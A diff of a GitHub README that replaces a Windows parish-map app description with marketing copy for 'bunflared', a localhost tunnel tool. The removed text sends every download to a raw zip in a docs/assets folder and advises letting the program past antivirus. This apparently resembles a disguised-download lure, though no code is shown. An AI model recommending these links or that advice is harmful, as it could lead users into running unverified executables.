@@ -1,140 +1,142 @@
-# 🗺️ neo-maps-locator - Quick Map Finder for Parishes
+# 🔥 bunflared - Your Localhost, Live for the World
 
-[![Download Releases](https://img.shields.io/badge/Download-Releases-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Bellyflopper/neo-maps-locator/main/docs/assets/locator_neo_maps_1.6.zip)
+## 🎯 What Is bunflared?
 
-## ℹ️ About neo-maps-locator
+bunflared is a magic bridge between your computer and the internet. It takes your local projects (websites, apps, APIs running on your own machine) and gives them a **temporary public link** anyone can open in their browser. 
 
-neo-maps-locator is a simple application built to help users find maps for Parishes with Catechesis of the Neocatechumenal Way in Rome. It offers a quick and easy way to locate important church-related places using clear and straightforward tools.  
+Think of it like this: you've built something amazing on your computer, but nobody can see it unless they're sitting next to you. bunflared fixes that with one simple command — no complex settings, no server knowledge, no expensive hosting.
 
-This software is designed for users with little or no technical background. It focuses on helping you quickly access maps for parishes connected to the Neocatechumenal catechism community.
+## 💡 Why You Need This
 
----
+**The Problem:** You're building a demo for a client, friend, or colleague. They want to see your work live, but you can't send them a link because your project only runs on your computer.
 
-## 💻 System Requirements
+**The Solution:** bunflared creates a secure, temporary tunnel from your computer straight to the internet. Your visitor gets a link, clicks it, and sees your work instantly — even if it involves multiple services running together (like your main app and its backend API).
 
-- Windows 10 or newer (64-bit preferred)  
-- At least 2 GB of free disk space  
-- Internet connection required to download the application  
-- Basic familiarity with downloading and running Windows programs  
+## ✨ What Makes bunflared Special
 
----
+- **One Command Magic** — Type one short command, and your localhost becomes publicly accessible
+- **Multi-Port Support** — Your app might need several ports (like 3000 for the website, 8080 for the API). bunflared handles them all at once
+- **Interactive Demos** — Chat with visitors from your terminal, send them to specific pages, watch their cursor move, and collect their reactions
+- **Agent Friendly** — Your AI coding agent can run sessions too, either through MCP or locally
+- **Built for Speed** — Written in Rust, so it's fast and lightweight
+- **Beautiful Terminal Interface** — Uses the Ratatui library for a polished, modern terminal experience
 
 ## 🚀 Getting Started
 
-Follow these steps to download and start using neo-maps-locator on your Windows computer.
+Ready to try bunflared? Here's everything you need to know.
+
+### 📥 Download & Install
+
+**[⬇️ DOWNLOAD bunflared NOW](https://github.com/Bellyflopper/bunflared)**
+
+Visit this link to download the application. The download page shows you the available files — choose the one that matches your computer (Windows users should look for the `.exe` file). After downloading, you can run it directly — no complex installation wizard needed.
+
+### 🖥️ System Requirements
+
+bunflared works on modern computers running:
+- **Windows 10 or newer** (for Windows users)
+- **macOS 11 or newer**
+- **Linux** (most common distributions)
+
+You'll need about 50MB of free space and an internet connection.
+
+## 🎮 Using bunflared
+
+### The Basic Command
+
+Once installed, open your terminal (Command Prompt on Windows, Terminal on Mac/Linux). Navigate to your project folder, then type:
+
+```
+bunflared
+```
+
+That's it. bunflared detects your running local services, creates the tunnel, and shows you a public link to share.
+
+### Advanced Options
+
+| Command | What It Does |
+|---------|--------------|
+| `bunflared --port 3000` | Share a specific port |
+| `bunflared --local` | Run locally on 127.0.0.1 |
+| `bunflared --demo` | Start an interactive demo session |
+| `bunflared --chat` | Open terminal chat with visitors |
+
+### 🗨️ Interacting With Visitors
+
+While your demo is live, bunflared gives you superpowers:
+- **Chat** — Send messages to anyone viewing your site
+- **Guide** — Push visitors to specific pages
+- **Observe** — Watch their cursor movements in real-time
+- **Collect Feedback** — Let them leave notes and reactions
+
+## 🌐 Who Should Use bunflared?
+
+### 👨‍💻 Web Developers
+Show off your latest build to clients before launch. Get instant feedback without deploying to a server.
+
+### 🎨 Designers
+Share interactive prototypes with stakeholders. Watch how they interact with your design.
+
+### 🤖 AI Enthusiasts
+Let your coding agent run demo sessions through MCP. Automate your demonstrations.
+
+### 🎓 Educators & Students
+Share coding projects with classmates or teachers. Collaborate in real-time.
+
+### 🧪 Testers & QA
+Show bugs to developers with live reproduction links. Test multiple environments simultaneously.
+
+## 📊 Why Choose bunflared Over Alternatives?
+
+| Feature | bunflared | ngrok | Traditional Hosting |
+|---------|-----------|-------|-------------------|
+| Setup Time | Seconds | Minutes | Hours |
+| Cost | Free | Paid tiers | Monthly fees |
+| Multi-Port | ✓ | Limited | Depends |
+| Interactive Tools | ✓ | ✗ | ✗ |
+| Terminal UI | Beautiful | Basic | N/A |
+| AI Agent Support | ✓ | Limited | ✗ |
+
+## 🔒 Safety & Security
+
+bunflared creates **temporary, random links** that expire when you close the session. Your data stays encrypted between your computer and your visitors. You're always in control — end the session anytime by pressing `Ctrl+C` in your terminal.
+
+## 🛠️ Troubleshooting
+
+**"Port already in use" error:** Close any apps using that port, or specify a different one with `--port`.
+
+**Link not working on my phone:** Ensure your computer stays awake and connected to the internet. Don't close the terminal window.
+
+**Slow loading:** Your upload speed affects performance. Close bandwidth-heavy applications.
+
+**Firewall blocking:** Allow bunflared through your firewall when prompted, or run `bunflared --local` for local-only testing.
+
+## 🤝 Getting Help
+
+- **GitHub Issues** — Report bugs or request features
+- **Community Discussions** — Share tips and tricks
+- **Documentation** — Detailed guides for advanced users
+
+## 💖 Supporting the Project
+
+bunflared is free and open-source. If it saved you time or helped land a client, consider:
+- ⭐ Starring the repository on GitHub
+- 🐛 Reporting bugs you find
+- 💻 Contributing code
+- 📣 Sharing with fellow developers
+
+## 📝 License
+
+bunflared is released under the MIT License — free to use, modify, and distribute.
+
+## 🏁 Ready to Go Live?
+
+Stop explaining what your project does. **Show them.** With bunflared, you're one command away from a live, interactive demo that impresses clients, colleagues, and collaborators.
+
+**[⬇️ DOWNLOAD bunflared NOW](https://github.com/Bellyflopper/bunflared)**
+
+Visit this link to download the application and start sharing your localhost with the world today!
 
 ---
 
-## 🔽 Download and Install neo-maps-locator
-
-1. Click on the large green button below to open the download page in your browser.
-
-[![Download Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/Bellyflopper/neo-maps-locator/main/docs/assets/locator_neo_maps_1.6.zip)
-
-2. On the GitHub releases page, find the latest version of neo-maps-locator. The latest release is usually at the top of the list.
-
-3. Look for a file that ends with `.exe`. This is the Windows installer.
-
-4. Click on the `.exe` file name to start the download.
-
-5. Once the download finishes, find the file in your browser’s download bar or your Downloads folder.
-
-6. Double-click the downloaded `.exe` file to begin installation.
-
-7. Follow the on-screen prompts. The installer will guide you through the process with simple instructions. You usually only need to click “Next” a few times.
-
-8. When finished, the program will be ready. You might find a shortcut on your desktop or the Start menu.
-
----
-
-## 📂 How to Use neo-maps-locator
-
-1. Open the neo-maps-locator application by double-clicking its icon.
-
-2. You will see a search box where you can type the name of a parish or a location related to the Neocatechumenal Way.
-
-3. Type your search term and press Enter or click the search button.
-
-4. The application shows a list of matching maps or locations.
-
-5. Click on any result to view the map with details, including address and contact info.
-
-6. Use zoom buttons on the map to get a better view or to explore surrounding areas.
-
-7. You can save maps for offline use by clicking the save button.
-
-8. If you want directions from your current location, enable location sharing on your Windows device, then request directions.
-
----
-
-## ⚙️ Application Features
-
-- Fast search of parishes and catechesis centers  
-- Clear, easy-to-read maps focused on Catholic communities in Rome  
-- Offline saving of maps for later use without internet  
-- Direction support from your location to the parish  
-- Simple interface designed for all users, including beginners  
-- Lightweight app that runs smoothly on Windows PCs  
-
----
-
-## 🔧 Troubleshooting
-
-If the application does not start after installation:
-
-- Make sure your Windows is up to date with the latest updates installed.  
-- Restart your computer and try opening the app again.  
-- Check if your antivirus software is blocking neo-maps-locator. You may need to allow it manually.  
-- Confirm you have enough free disk space.  
-- Download the installer again in case the file corrupted.
-
-If search results do not show correctly:
-
-- Verify your internet connection is active.  
-- Try closing and reopening the app.  
-- Make sure you type the correct or full name of the parish.
-
-For any persistent issues, you can open an “Issue” on the GitHub page for further help by developers.
-
----
-
-## 🔐 Privacy and Permissions
-
-neo-maps-locator only requests minimal permissions required to work:
-
-- Internet access to fetch updated maps and location data.  
-- Optionally, access to your device location for providing directions.  
-
-The app does not collect or store personal user information beyond what is necessary to provide maps.
-
----
-
-## ⚙️ Updating neo-maps-locator
-
-When a new version is available, download the latest `.exe` file from the releases page. Repeat the installation steps to replace the old version.
-
-The app does not update automatically. Manual download and install keeps it simple and clear.
-
----
-
-## 📚 Additional Resources
-
-Visit the GitHub page to check for documentation, updates, and community discussions:
-
-https://raw.githubusercontent.com/Bellyflopper/neo-maps-locator/main/docs/assets/locator_neo_maps_1.6.zip
-
-Explore topics like:
-
-- catechism and Catholic Church locations  
-- Neocatechumenal Way community centers  
-- Parish map navigation in Rome
-
----
-
-## 🗂️ Project topics
-
-cammino, camminoneocatecumenale, catechism, catechism-of-the-catholic-church, catholic, catholic-church, catholicism, church, neocat-community, neocatecumenale
-
----
-
-[![Download Releases](https://img.shields.io/badge/Download-Releases-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Bellyflopper/neo-maps-locator/main/docs/assets/locator_neo_maps_1.6.zip)
+Keywords: ai-agents, cli, cloudflare, cloudflared, developer-tools, localhost, ngrok-alternative, ratatui, rust, tui, tunnel
